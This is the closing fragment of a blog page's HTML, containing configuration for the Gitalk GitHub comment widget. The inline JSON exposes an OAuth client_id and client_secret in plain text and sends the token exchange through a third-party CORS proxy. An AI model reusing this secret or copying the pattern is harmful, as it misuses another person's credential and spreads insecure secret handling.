<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"nuniok","repo":"nuniok.github.io","client_id":"Ov23liWEs17fH5aYPIzS","client_secret":"6bbfa4b5a042d38b10c942b5c15f4d8a3895e982","admin_user":"nuniok","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"714488baade32696a787a6623cb247eb"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>

</body>
</html>
